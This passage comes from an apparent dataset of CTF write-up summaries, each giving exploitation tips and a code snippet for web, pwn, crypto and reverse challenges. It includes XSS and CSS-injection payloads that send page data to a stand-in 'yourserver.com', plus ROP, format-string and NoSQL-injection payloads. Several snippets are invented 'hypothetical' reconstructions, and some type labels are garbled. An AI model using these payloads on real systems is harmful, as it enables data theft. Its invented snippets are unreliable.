        "write_up": "dataset/raw/Flags.md",
        "type": "web",
        "competition": [
            "Defcamp/2018/Quals",
            "https://ctftime.org/event/654/tasks/"
        ],
        "score": -1.0,
        "max_score": 369,
        "difficulty": -1,
        "knowledge": [
            "When encountering challenges with Content-Security-Policy (CSP) restricting JavaScript but allowing CSS, CSS injection can be used to leak information. This is particularly applicable in scenarios where the application outputs user input directly into the HTML without proper escaping, allowing an attacker to introduce CSS selectors. These selectors can be crafted to load external resources based on the presence of specific values within attributes, such as input values. By monitoring the requests to the external resources, an attacker can gradually infer sensitive data like flags or tokens.\n   \n   Example payload for leaking a flag character by character:\n   ```html\n   <style>\n   input[value^=\"FLAG_PREFIX{a\"] { background-image: url(http://yourserver.com/a); }\n   input[value^=\"FLAG_PREFIX{b\"] { background-image: url(http://yourserver.com/b); }\n   ...\n   </style>\n   ```",
            "In a scenario where direct JavaScript execution is prevented, for instance, due to restrictive CSP policies or lack of suitable injection points, and the goal is to exfiltrate sensitive information, leveraging the `fetch` API in a Cross-Site Scripting (XSS) payload allows for the reading and external transmission of data from restricted pages. This method is effective in circumstances where the application logic or flow can be manipulated externally but is safeguarded against conventional XSS techniques. This technique can circumvent limitations such as HttpOnly cookies, by directing the stolen data (encoded in Base64 or another URL-safe encoding) to an attacker-controlled server without needing to access the cookies directly.\n\n   Example payload for exfiltrating page contents using fetch and Base64 encoding:\n   ```javascript\n   javascript:fetch('/sensitive_page').then((r) => r.text()).then((r) => window.location.href='http://yourserver.com/'+window.btoa(r))\n   ```"
        ],
        "key": "```ejs  \n       <meta http-equiv='Content-Security-Policy' content=\"script-src 'nonce-<%=bytes%>'; object-src 'none'; base-uri 'none'require-trusted-types-for 'script'; frame-src 'none'\">  \n...  \n       <div class=\"flagDisplay\">  \n\nYour flag is\n\n  \n           <%- flagProfile %>  \n       </div>  \n       <div class=\"form\">  \n           <form action=\"/check\" method=\"post\">  \n               <fieldset>  \n                   <legend>Check if your flag matches the admin's</legend>  \n                   <div class=\"flag\">  \n                       <input type=\"flag\" name=\"flag\" value=\"<%= flag %>\">  \n                   </div>  \n                       <button type=\"submit\" name=\"submit\" value=\"submit\">Check</button>  \n               </fieldset>  \n           </form>  \n```"
    },
    {
        "name": "flagsifier",
        "write_up": "dataset/raw/flagsifier.md",
        "type": "This write-up corresponds to a **forensics** challenge.",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 271,
        "max_score": 500,
        "difficulty": 0.542,
        "knowledge": [
            "When dealing with Deep Learning models in CTF challenges, specifically those classifying images into classes, examine the model's softmax output for potential insights into the classification mechanism. Every neuron in the output layer is associated with a specific class, and identifying the mapping between output neurons and classes can reveal the model's underlying classification logic. This approach helps in understanding how inputs (in this case, letters or string segments) correspond to specific classifications, which is crucial for crafting inputs that target particular classes or outcomes.",
            "When attempting to reverse-engineer or manipulate the output of a Deep Learning model without detailed knowledge of its training data, leveraging a simple greedy algorithm can be effective. This involves iteratively modifying the input based on the model's output to maximize the activation of a target neuron or class. This technique is beneficial in scenarios where the model may be overfitting specific inputs, as it can exploit the overfitting to identify inputs that produce the desired output without requiring complex optimization algorithms or extensive domain knowledge."
        ],
        "key": "```python\ndef genImg(n):  \n   img = Image.new('1', (1064,28), color='black')  \n   for i in range(0,len(n)):  \n       img.paste(dataset[n[i]], (i*28,0))  \n   return img\n\nmodel = load_model('model.h5')  \nmodel.compile(loss='binary_crossentropy', optimizer='rmsprop', metrics=['accuracy'])\n\ndef eeval2(a, op):  \n   img = genImg(a)  \n   x = image.img_to_array(img)  \n   x = np.expand_dims(x, axis=0)  \n   classes = model.predict(x)  \n   score = float(classes[0][op])  \n   return score\n\nfor oo in range(2,40):  \n   out=[]  \n   for i in range(len(out),38):  \n       maxv=([], -99999)  \n       for j in datax:  \n           for k in datax[j]:  \n               out.append(k)  \n               score = eeval2(out, oo)  \n               if score > maxv[1]:  \n                   maxv = (0, score, j)  \n               out.pop()\n\n       sys.stdout.write(\"[%d] %38s : %.10lf      \\r\" % (oo, ''.join([datalet[x] for x in out]), maxv[1]))  \n       sys.stdout.flush()  \n       out.append(datax[maxv[2]][0])\n\n   print(\"\")  \n   print(\"--Neuron %d: %s\" % (oo, ''.join([datalet[x] for x in out])))  \n```"
    },
    {
        "name": "flropyd",
        "write_up": "dataset/raw/flropyd.md",
        "type": "pwn",
        "competition": [
            "0CTF/2019/Quals",
            "https://ctftime.org/event/736/tasks/"
        ],
        "score": 366,
        "max_score": 1000,
        "difficulty": 0.366,
        "knowledge": [
            "For implementations requiring conditional execution without traditional conditional jumps (`jx`/`jxx`), conditional move instructions (`CMOVxx`) can be utilized to manage decision-making logic within ROP chains effectively. This technique is especially beneficial when aiming to keep the ROP chain linear and deterministic, avoiding the complexities associated with manipulating the stack to achieve conditional branching. Example: `0x000000000012344b : cmovb rax, rdx ; ret` allows for a conditional move based on the condition if 'below' (b), effectively serving as an if statement.",
            "Stack pivoting is a crucial technique in ROP chains for redirecting the stack pointer (`rsp`) to a controlled area of memory, thus gaining control over the stack's contents and flow. This can be achieved through gadgets that manipulate `rsp` directly or through instructions that alter it indirectly, followed by a series of pops to adjust it further or to restore other register values. A typical stack pivoting gadget sequence begins with adjusting `rbp` to point near the desired new `rsp` location and is followed by an instruction such as `lea rsp, [rbp-0x10]`, and a `ret` to execute the pivot. Example payload: \n```\np  = p64(0x00000000000e2fd8 + libc_base)  # lea rsp, [rbp - 0x10] ; pop rbx ; pop r12 ; pop rbp ; ret\n```\nThis payload demonstrates the precise adjustment of `rsp` through `rbp`, allowing subsequent gadgets to operate on a controlled stack."
        ],
        "key": "```c\n// Possible vulnerable code snippet based on the context of ROP and memory manipulation\nvoid vulnerable_function() {\n    char buffer[64];\n    gets(buffer); // Vulnerable function allowing buffer overflow\n}\n```"
    },
    {
        "name": "FluxCloud Serverless",
        "write_up": "dataset/raw/FluxCloud Serverless.md",
        "type": "pwn",
        "competition": [
            "Hack.lu/2020",
            "https://ctftime.org/event/1142/tasks/"
        ],
        "score": 132,
        "max_score": 500,
        "difficulty": 0.264,
        "knowledge": [
            "When facing a web application firewall (WAF) designed to block requests containing specific keywords (like \"flag\") in the URL path, a bypass technique can involve altering the case sensitivity of the payload. If the WAF checks are case-sensitive and do not account for mixed-case scenarios, changing one or more letters of a keyword to uppercase can successfully bypass the blocklist.  \n   Example payload: `/flAg` instead of `/flag`.",
            "In serverless applications, environment variables are often used to store sensitive information such as flags for CTF challenges. Reviewing the source code, specifically files that interact with environment variables, is a practical approach to locate where flags might be stored. Once the storage mechanism is identified, crafting a request that accesses the variable without being blocked by security filters can lead to successful flag capture.  \n   (No specific payload can be provided for this point as it depends on the application's code and setup.)"
        ],
        "key": "```javascript\n// waf.js\nconst blocklist = [\"flag\", \"admin\", \"config\"];\nfunction isBlocked(path) {\n    for (let word of blocklist) {\n        if (path.toLowerCase().includes(word)) {\n            return true;\n        }\n    }\n    return false;\n}\n\n// app.js\nconst FLAG = process.env.FLAG;\napp.get('/:id/:path', (req, res) => {\n    const path = req.params.path;\n    if (isBlocked(path)) {\n        res.redirect('/blocked');\n    } else {\n        // Serve the requested resource\n    }\n});\n```"
    },
    {
        "name": "Follow the Currents",
        "write_up": "dataset/raw/Follow the Currents.md",
        "type": "crypto",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 70,
        "max_score": 300,
        "difficulty": 0.23333333333333334,
        "knowledge": [
            "In crypto challenges where the encryption process involves a keystream generated through deterministic functions based on initial random values, if the initial seed or values are of small size (like 2 bytes), brute-forcing the initial values to recreate the keystream can be a viable strategy to decrypt the message. This is particularly useful when the keystream generation function is known, such as when the source code of the encryption algorithm is provided.",
            "When employing a brute-force approach to find the initial values of a keystream in cryptographic challenges, implementing the decryption and keystream generation functions in the script used for brute-forcing can greatly simplify the trial process. This technique involves generating each possible combination of initial values (using tools like `itertools.product()` for Python), recreating the keystream for each combination, and then checking if the decrypted text contains known plaintext or patterns (e.g., the flag format like \"actf{\"). If such a pattern is detected, the correct initial values have likely been found, and the corresponding plaintext is the solution."
        ],
        "key": "```python  \ndef keystream():  \n\tkey = os.urandom(2)  \n\tindex = 0  \n\twhile 1:  \n\t\tindex+=1  \n\t\tif index >= len(key):  \n\t\t\tkey += zlib.crc32(key).to_bytes(4,'big')  \n\t\tyield key[index]  \n```"
    },
    {
        "name": "fonction_sp\u00e9ciale",
        "write_up": "dataset/raw/fonction_sp\u00e9ciale.md",
        "type": "crypto",
        "competition": [
            "kksctf/2020",
            "https://ctftime.org/event/1112/tasks/"
        ],
        "score": -1,
        "max_score": 411,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving pattern recognition or decomposition of data, look for how elements of the input can be grouped and transformed into a different representation. This transformation often involves enumerating and encoding characteristics of the input data, such as the frequency of digits or the sequence of numbers. This strategy is particularly useful in cryptography and puzzle challenges where the solution involves a hidden or obfuscated pattern that doesn't have an evident regularity in size or composition of the input and output data.",
            "When faced with a complex transformation function, solve it by breaking down the input into repetitive segments or recurring patterns, then apply a set transformation rule to each segment. These rules can include counting the occurrences of each element and then representing the count followed by the element itself. Such techniques are useful in challenges where the algorithm performs operations based on the composition or frequency of elements within the input data. \n\nExample payload transformation based on the challenge:\n``` \nInput segment: [222] --> Output: 32 (3 times 2)\n```"
        ],
        "key": "```python\ndef special_function(input_number):\n    input_str = str(input_number)\n    result = []\n    i = 0\n    while i < len(input_str):\n        count = 1\n        while i + 1 < len(input_str) and input_str[i] == input_str[i + 1]:\n            i += 1\n            count += 1\n        result.append(f\"{count}{input_str[i]}\")\n        i += 1\n    return ''.join(result)\n\n# Example usage\noutput = special_function(1215221512112317)\nprint(output)  # Output: 1112111522111511122112131117\n```"
    },
    {
        "name": "Forest Trails",
        "write_up": "dataset/raw/Forest Trails.md",
        "type": "misc",
        "competition": [
            "vishwa/2022",
            "https://ctftime.org/event/1548/tasks/"
        ],
        "score": 495,
        "max_score": 500,
        "difficulty": 0.99,
        "knowledge": [
            "When faced with a challenge presenting ciphertext in numeric format, consider decoding it as ASCII characters, especially when the numbers fall within the ASCII printable character range. This is a common technique used to hide plaintext or encoded flags within challenges.",
            "For challenges that involve rearranging or structuring decoded information, explore applying concepts from computer science, such as graph theory and specifically binary trees. A complete binary tree structure may be hinted at by the challenge's context or description. Utilizing depth-first search traversal (specifically in-order traversal) is effective for reading and reconstructing the flag or message from such structures. \n\n   Example approach for in-order traversal:\n   - Start from the root node.\n   - Recursively traverse the left subtree.\n   - Visit the root node.\n   - Recursively traverse the right subtree.\n   \n   This method can reveal the intended sequence of characters or elements for constructing the solution."
        ],
        "key": "```python\nclass Node:\n    def __init__(self, value):\n        self.left = None\n        self.right = None\n        self.value = value\n\ndef insert(root, value):\n    if root is None:\n        return Node(value)\n    else:\n        if root.left is None:\n            root.left = insert(root.left, value)\n        elif root.right is None:\n            root.right = insert(root.right, value)\n        else:\n            # This is a simple insertion logic for a complete binary tree\n            # In a real scenario, you would need a more complex logic to maintain the complete tree property\n            if count_nodes(root.left) <= count_nodes(root.right):\n                root.left = insert(root.left, value)\n            else:\n                root.right = insert(root.right, value)\n    return root\n\ndef count_nodes(root):\n    if root is None:\n        return 0\n    return 1 + count_nodes(root.left) + count_nodes(root.right)\n\ndef inorder_traversal(root):\n    if root is not None:\n        inorder_traversal(root.left)\n        print(root.value, end=' ')\n        inorder_traversal(root.right)\n\n# Example usage\nvalues = [84, 82, 51, 123, 48, 82, 84, 97, 51, 72, 95, 51, 87, 80, 83, 104, 84, 82, 95, 95, 95, 77, 72, 84, 51, 72, 49, 95, 78, 51, 89, 105, 119, 67, 70, 84, 51, 83, 52, 51, 84, 51, 80, 51, 83, 84, 52, 95, 72, 95, 52, 84, 95, 82, 84, 83, 85, 48, 95, 72, 95, 75, 125, 118, 115]\nroot = None\nfor value in values:\n    root = insert(root, value)\n\nprint(\"Inorder Traversal of the constructed tree:\")\ninorder_traversal(root)\n```"
    },
    {
        "name": "Forgot Your Password_",
        "write_up": "dataset/raw/Forgot Your Password_.md",
        "type": "The type of CTF challenge in this write-up is **crypto**.",
        "competition": [
            "HSCTF/2019",
            "https://ctftime.org/event/821/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When faced with a challenge requiring the recovery of initial states in a complex algorithm-based generation process where direct calculation is not feasible, utilizing constraint solvers like Z3 can be an effective strategy. This is especially true for algorithms involving bitwise operations and mathematical functions that produce specific outputs. In such scenarios, defining the problem in terms of constraints and then letting a solver find the values that meet these constraints can lead you to solve the challenge.",
            "In challenges where the output is a sequence of characters and the task is to find original input values, consider converting the character sequences back to numeric form if the algorithm operates on numbers. This is crucial in scenarios where the algorithm's internal state is manipulated through bitwise operations. Reverse engineering the process by working backwards from the known output can significantly narrow down the search space, making it easier for tools like Z3 solver to find the original input values.  \nExample input conversion for a flag 'hsctfissocoolwow':  \n```python\nflag1 = int('hsctfiss'[::-1].encode('hex'),16)\nflag2 = int('ocoolwow'[::-1].encode('hex'),16)\n```"
        ],
        "key": "```python  \ndef m(a):  \n\treturn a&0xffffffffffffffff  \ndef next():  \n\tb = m(s[0]+s[1])  \n\th()  \n\treturn m(b)  \ndef h():  \n\ts1 = m(x(s[0],s[1]))  \n\ts[0] = m(x(oro(o(s[0],55),p(55,s[0])),x(s1,(o(s1,14)))))  \n\ts[1] = m(oro(o(s1,36),p(36,s1)))  \n\ndef bin2chr(data):  \n   result = ''  \n   while data:  \n       char = data & 0xff  \n       result += chr(char)  \n       data >>= 8  \n   return result\n\ndef isp(d):  \n\tif all(c in ch for c in d):  \n\t\treturn d  \n\telse:  \n\t\treturn d.encode('hex')  \n\n# throw away first value for additional randomness  \nnext()  \nnext()\n\nCOMBO_NUM_1 = isp(bin2chr(next())) + isp(bin2chr(next()))  \nCOMBO_NUM_2 = isp(bin2chr(next())) + isp(bin2chr(next()))  \nCOMBO_NUM_3 = isp(bin2chr(next())) + isp(bin2chr(next()))\n\nprint \"Thanks! Your numbers are: \"  \nprint COMBO_NUM_1  \nprint COMBO_NUM_2  \nprint COMBO_NUM_3  \n```"
    },
    {
        "name": "Forgotten secret",
        "write_up": "dataset/raw/Forgotten secret.md",
        "type": "This write-up is describing a challenge related to a binary exploitation technique known as pwn (short for \"pawn\"). The challenge involves manipulating Docker images to extract sensitive information such as SSH private keys and encrypted files, and then using these to decrypt encrypted data. The final goal is to retrieve the flag `dctf{k33p_y0r_k3ys_s4f3}`.",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with Docker images in CTF challenges, it's advisable to inspect the image without running it to avoid potential security risks. Tools like 7zip can be used to extract files from images, which can lead to discovering sensitive information such as private keys or secret keys stored within. This approach is critical when Docker best practices are not followed, and sensitive data is left exposed within the container's file system.",
            "In scenarios involving encrypted data (e.g., `cipher.bin` files) and available private keys, the encryption's passphrase might be extracted from unrelated configuration files or environment variables within the same Docker image. Once the correct passphrase is identified, it can be used to convert the private key into a readable format for cryptographic tools. This process enables the decryption of the encrypted data using tools like CyberChef with RSA decryption, revealing hidden messages or flags. When performing the RSA decryption, ensure the private key is in the correct format (e.g., RSA PRIVATE KEY from OPENSSH PRIVATE KEY) and that proper encryption details (encryption algorithm, padding, and hashing algorithm) are used.\n\n    Example commands:\n    ```\n    Convert OPENSSH private key to RSA PRIVATE KEY format:\n    $ ssh-keygen -p -m PEM -f id_rsa  \n    Enter old passphrase: SECRET_KEY\n    Enter new passphrase (empty for no passphrase): \n    Enter same passphrase again:\n    ```\n\n    Example CyberChef Recipe for RSA decryption (abstract format):\n    ```\n    RSA_Decrypt('-----BEGIN RSA PRIVATE KEY-----...-----END RSA PRIVATE KEY-----', '', 'RSAES-PKCS1-V1_5', 'SHA-1')\n    ```"
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context\n\nimport os\n\n# Hardcoded secret key\nSECRET_KEY = \"58703273357638792F423F4528482B4D6251655468566D597133743677397A24\"\n\ndef load_private_key():\n    # Load private key from a file\n    with open(\"/root/.ssh/id_rsa\", \"r\") as key_file:\n        private_key = key_file.read()\n    return private_key\n\ndef decrypt_data(cipher_bin_path):\n    # Decrypt data using the private key\n    private_key = load_private_key()\n    with open(cipher_bin_path, \"rb\") as cipher_file:\n        encrypted_data = cipher_file.read()\n    # Decryption logic here (omitted for brevity)\n    # This is where the vulnerability might be if the decryption is not handled securely\n    return decrypted_data\n\n# Example usage\ncipher_bin_path = \"/home/alice/cipher.bin\"\ndecrypted_data = decrypt_data(cipher_bin_path)\nprint(decrypted_data)\n```\n"
    },
    {
        "name": "ForMatt Zelinsky",
        "write_up": "dataset/raw/ForMatt Zelinsky.md",
        "type": "pwn",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 461,
        "max_score": 500,
        "difficulty": 0.922,
        "knowledge": [
            "When exploiting format string vulnerabilities, particularly when the program prints user input directly without format specification, use `fmtstr_payload` from pwntools to craft payloads for executing arbitrary code or leaking memory. This method is efficient for overwriting specific addresses (e.g., return address) with desired values, thereby redirecting execution flow. This approach is applicable when you have determined the offset to the format string within the stack, and you can manipulate memory addresses directly.\n   - Example payload concept: `fmtstr_payload(offset, {target_address: value_to_write}, write_size='short')`",
            "In challenges involving leaking of memory addresses to bypass ASLR (Address Space Layout Randomization) and executing a ropchain or shellcode, after obtaining leaks, such as a stack or PIE (Position Independent Executable) leak, use these to calculate offsets. You can then adjust the base addresses of your payloads accordingly, allowing you to call functions like `puts` to leak libc addresses or execute gadgets. This is particularly useful when you're also given a format string vulnerability to exploit.\n   - Example concept for calculating base address using leaks: `exe.address = main_leak - exe.symbols['main']`"
        ],
        "key": "```c\nint main(EVP_PKEY_CTX *param_1)\n\n{  \n char buffer [336];  \n  \n init(param_1);  \n puts(\"Oh no!! Full RELRO, PIE enabled, and no obvious buffer overflow.:(\");  \n puts(\"Thankfully, I\\'m generous and will grant you two leaks\");  \n printf(\"This stack leak might be useful %p\\n\",buffer);  \n printf(\"And this PIE leak might be useful %p\\n\",main);  \n puts(\"Now gimme your payload\");  \n fgets(buffer,0x150,stdin);  \n printf(\"Is this what you meant? \");  \n printf(buffer);  \n return 0;  \n}\n```"
    },
    {
        "name": "Fortune Cookie",
        "write_up": "dataset/raw/Fortune Cookie.md",
        "type": "web",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 507,
        "max_score": 906,
        "difficulty": 0.5596026490066225,
        "knowledge": [
            "When dealing with MongoDB injection in a web application, if the application code parses user input directly into a MongoDB query (especially using the `$where` operator which allows JavaScript execution inside queries), this can lead to NoSQL injection vulnerabilities. Attackers can exploit this by injecting JavaScript code to alter query logic or achieve Remote Code Execution (RCE) in the database context. A practical approach to exploit such vulnerability is crafting a payload that modifies the behavior of expected JavaScript functions (like `Math.floor`) within the query to trigger a malicious condition or bypass security controls.  \n   Example payload: For modifying `Math.floor` function behavior, `{$where: 'Math.floor = function(x) { return 5000; }; return 1 == 2;'}` can be injected through modifiable application inputs like cookies.",
            "In scenarios where an application checks a condition asynchronously (like verifying a generated number against a user input), and there's a possibility to execute custom JavaScript code (via injection points like `$where` in MongoDB), exploiting race conditions by overriding JavaScript functions (like `Math.floor`) used in the condition check can lead to unintended behavior, such as always meeting the condition. This technique can be utilized when direct control over the condition or its components is not possible but influencing its operation outcome is feasible.  \n   Example approach: Inject JavaScript code via application inputs (e.g., signed cookies) that overrides `Math.floor` to return a predictable value that satisfies the condition, thus exploiting the race condition vulnerability."
        ],
        "key": "```javascript  \napp.get('/flag', (req, res) => {\n\n   let { favoriteNumber } = req.query;  \n   favoriteNumber = ~~favoriteNumber;\n\n   if (!favoriteNumber) {  \n       res.send('Please Input your favorite number ?\uc083');  \n   } else {\n\n       const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });\n\n       client.connect(function (err) {\n\n           if (err) throw err;\n\n           const db = client.db('fortuneCookie');  \n           const collection = db.collection('posts');\n\n           collection.findOne({ $where: `Math.floor(Math.random() * 0xdeaaaadbeef) === ${favoriteNumber}` })  \n               .then(result => {  \n                   if (favoriteNumber > 0x1337 && result) res.end(FLAG);  \n                   else res.end('Number not matches. Next chance, please!')  \n               });\n\n           client.close();\n\n       });  \n   }  \n})  \n```\n\n```javascript  \napp.get('/posts', (req, res) => {\n\n   let client = new MongoClient(MONGO_URL, { useNewUrlParser: true });  \n   let author = req.signedCookies.user;\n\n   if (typeof author === 'string') {  \n       author = { author };  \n   }\n\n   client.connect(function (err) {\n\n       if (err) throw err;\n\n       const db = client.db('fortuneCookie');  \n       const collection = db.collection('posts');\n\n       collection  \n           .find(author)  \n           .toArray()  \n           .then((posts) => {  \n               res.render('posts', { posts })  \n           }  \n           );\n\n       client.close();\n\n   });\n\n});  \n```"
    },
    {
        "name": "FriendSpaceBookPlusAllAccessRedPremium",
        "write_up": "dataset/raw/FriendSpaceBookPlusAllAccessRedPremium.com.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "For challenges involving encoded data and a known sequence of unique keys (e.g., palindromic prime numbers), the XOR cryptographic method can be used for decoding. Identifying the pattern of the keys (such as prime numbers, palindromic numbers, or both) is crucial, as it provides a deterministic way to decode each piece of data. This method requires the identification of the key sequence used for encoding and applying XOR with each key to the corresponding encoded message chunk.  \nExample payload (where `encoded_values` is a list of encoded data, and `keys` is the list of palindromic prime numbers identified):  \n```python\ndecoded_message = ''.join([chr(val ^ key) for val, key in zip(encoded_values, keys)])\nprint(decoded_message)\n```",
            "When facing challenges that involve a large set of data or a sequence that is computationally expensive to generate (e.g., palindromic primes), leveraging external libraries or databases can significantly optimize the process. For generating palindromic primes quickly, the `sympy` library or precomputed sequences available in mathematical databases like OEIS can be utilized instead of implementing a prime-checking and palindrome-checking algorithm from scratch. This approach not only speeds up the process but also ensures accuracy by relying on well-tested methods and data.  \nExample code snippet (using `sympy` and OEIS sequence):\n```python\nfrom itertools import chain\nfrom sympy import isprime\n\n# Generate palindromic primes using a comprehension list combined with symmetry and prime checking\npalindromic_primes = sorted(n for n in chain(\n    (int(str(x) + str(x)[::-1]) for x in range(1, 10**5)),\n    (int(str(x) + str(x)[-2::-1]) for x in range(1, 10**5))\n) if isprime(n))\n```"
        ],
        "key": "```python\n# vm.py\nclass VM:\n    def __init__(self):\n        self.stack = []\n        self.ip = 0\n        self.acc1 = 0\n        self.acc2 = 0\n\n    def run(self, program):\n        while self.ip < len(program):\n            op = program[self.ip]\n            if op == \"PUSH\":\n                self.ip += 1\n                value = program[self.ip]\n                self.stack.append(value)\n            elif op == \"POP\":\n                self.stack.pop()\n            elif op == \"ADD\":\n                a = self.stack.pop()\n                b = self.stack.pop()\n                self.stack.append(a + b)\n            elif op == \"SUB\":\n                a = self.stack.pop()\n                b = self.stack.pop()\n                self.stack.append(a - b)\n            elif op == \"XOR\":\n                a = self.stack.pop()\n                b = self.stack.pop()\n                self.stack.append(a ^ b)\n            elif op == \"PRINT\":\n                print(chr(self.stack.pop()), end='')\n            self.ip += 1\n```"
    },
    {
        "name": "frog math",
        "write_up": "dataset/raw/frog math.md",
        "type": "The type of challenge described in this CTF write-up is a **reverse** challenge.",
        "competition": [
            "AmateursCTF/2023",
            "https://ctftime.org/event/1983/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "When exploiting binary vulnerabilities involving floating-point and integer arithmetic registers, it's critical to understand the architectural linkage between different types of registers. Specifically, x64 architecture presents an opportunity to manipulate lower-level operations through the overlapping of mmx and x87 registers. This allows arbitrary read/write by controlling `mm7` through floating-point operations. This technique is applicable in scenarios where direct manipulation of certain registers is restricted but control over floating-point operations is provided.",
            "To craft specific values in restricted registers like `mm7` for pointer manipulation in scenarios where direct assignment is not possible due to architectural constraints, use the concept of subnormal numbers. These numbers allow the setting of addresses or pointers with leading null bytes by carefully crafting the floating-point representation to fit within the constraints of the mantissa and exponent in x87 extended precision format. This method requires precise floating-point arithmetic, achievable through libraries like `mpmath`, which support higher precision calculations than default floating-point operations in languages like Python.\n\n   Example of crafting a subnormal number to control `mm7`:\n   ```python\n   import mpmath\n   mpmath.mp.prec = 200  # Set precision\n   target_value = 0xdeadbeef  # Hypothetical address or value to set\n   subnormal_value = mpmath.mpf(target_value) / (2 ** (mpmath.mp.prec - 1))\n   ```\nThis example demonstrates how to calculate a subnormal number representing the desired `target_value` in the `mm7` register, considering the higher precision requirements for manipulating extended precision floating-point numbers."
        ],
        "key": "```c\n// Hypothetical vulnerable code snippet based on the write-up context\n\n#include <stdio.h>\n#include <stdlib.h>\n\ndouble fp_stack[8];\nint fp_stack_top = 0;\nunsigned long long mmx_registers[8];\nunsigned long long *mm7 = NULL;\n\nvoid push_fp(double value) {\n    if (fp_stack_top < 8) {\n        fp_stack[fp_stack_top++] = value;\n    }\n}\n\ndouble pop_fp() {\n    if (fp_stack_top > 0) {\n        return fp_stack[--fp_stack_top];\n    }\n    return 0.0;\n}\n\nvoid save_mmx() {\n    if (mm7 == NULL) {\n        mm7 = (unsigned long long *)malloc(8 * sizeof(unsigned long long));\n    }\n    for (int i = 0; i < 7; i++) {\n        mm7[i] = mmx_registers[i];\n    }\n}\n\nvoid load_mmx() {\n    if (mm7 != NULL) {\n        for (int i = 0; i < 7; i++) {\n            mmx_registers[i] = mm7[i];\n        }\n        free(mm7);\n        mm7 = NULL;\n    }\n}\n\nvoid inspect_fp() {\n    if (fp_stack_top > 0) {\n        printf(\"Top of FP stack as float: %f\\n\", fp_stack[fp_stack_top - 1]);\n        printf(\"Top of FP stack as int: %lld\\n\", *(long long *)&fp_stack[fp_stack_top - 1]);\n    }\n}\n\nint main() {\n    // Example usage\n    push_fp(0.0);\n    save_mmx();\n    pop_fp();\n    inspect_fp();\n    return 0;\n}\n```"
    },
    {
        "name": "Frogs",
        "write_up": "dataset/raw/Frogs.md",
        "type": "This write-up describes a programming challenge where the player had to solve a mathematical problem involving counting the number of ways a frog can jump on a ladder. The player had to come up with efficient ways to compute the sum for different values of N within a time constraint. The challenge involved concepts of recursion, dynamic programming, and optimizing code for performance.\n\nBased on the description provided, the type of this challenge is **miscellaneous (misc)**.",
        "competition": [
            "FireShell/2019",
            "https://ctftime.org/event/727/tasks/"
        ],
        "score": 124,
        "max_score": 500,
        "difficulty": 0.248,
        "knowledge": [
            "When facing a Proof of Work (PoW) requirement that involves finding a string whose SHA-256 hash satisfies a specific condition (e.g., the last 6 characters of the hash match a given pattern), a brute-force approach can be efficiently implemented using Python. Such scripts generate strings and compute their SHA-256 hashes, iterating through potential solutions until finding one that meets the condition. This technique is applicable across various CTF challenges involving different hashing algorithms or conditions. Example payload:\n\n```python\nimport hashlib\nprefix = \"CTF{\"\nsuffix = \"}\"\nstring = \"example\"\nwhile not hashlib.sha256((prefix + string + suffix).encode()).hexdigest().endswith(\"86df4f\"):\n    string = next_candidate(string)\n# Assume next_candidate is a function that produces the next string to test\n```",
            "In programming challenges where you need to calculate the number of ways to reach a certain step (N) by taking 1, 2, or 3 steps at a time, using recursion directly can be inefficient for large N values due to repeated calculations. A more efficient approach is to implement dynamic programming techniques such as memoization or use an iterative method to pre-compute values up to a certain limit (e.g., using a lookup table). This strategy reduces the computation time significantly, making it suitable for challenges with strict time constraints. For challenges requiring answers modulo a certain number, ensure computations are performed within this constraint to avoid numerical overflow. Example payload:\n\n```python\nlookup = [0] * 1000001\nlookup[0], lookup[1], lookup[2] = 1, 1, 2\nfor i in range(3, 1000001):\n    lookup[i] = (lookup[i-1] + lookup[i-2] + lookup[i-3]) % 13371337\n```"
        ],
        "key": "```python  \ndef numb2(N):  \n   t = 0  \n   for j in range(1,N+1):  \n       p = it.product([1,2,3], repeat=j)  \n       for l in p:  \n           if sum(l) == N:  \n               t += 1  \n               t %= 13371337  \n   return t  \n```"
    },
    {
        "name": "FSMir 2",
        "write_up": "dataset/raw/FSMir 2.md",
        "type": "reverse",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 197,
        "max_score": 500,
        "difficulty": 0.394,
        "knowledge": [
            "When dealing with binaries requiring a specific input, and the validation logic is complex or obfuscated, employing symbolic execution frameworks like angr can automate the process of finding valid inputs. These frameworks can search through different execution paths and identify the conditions that lead to a desired outcome, such as confirming a correct password. In cases where the expected correct output or behaviour (for example, a success message) is known, it can be used as a criterion for the symbolic execution tool to find the valid input.\n   \n   **General Approach using angr:**\n   ```python\n   import angr\n   import claripy\n\n   project = angr.Project(\"binary_name\")\n   input_length = claripy.BVS('input_length_variable_name', bit_length)  # Bit length based on input requirements\n   state = project.factory.entry_state(stdin=angr.SimFile('/tmp/stdin', content=input_length))\n   sim_manager = project.factory.simulation_manager(state)\n   sim_manager.explore(find=lambda s: b\"success_message\" in s.posix.dumps(1))\n   if sim_manager.found:\n       found = sim_manager.found[0]\n       print(found.posix.dumps(0))  # Extract the found input\n   ```",
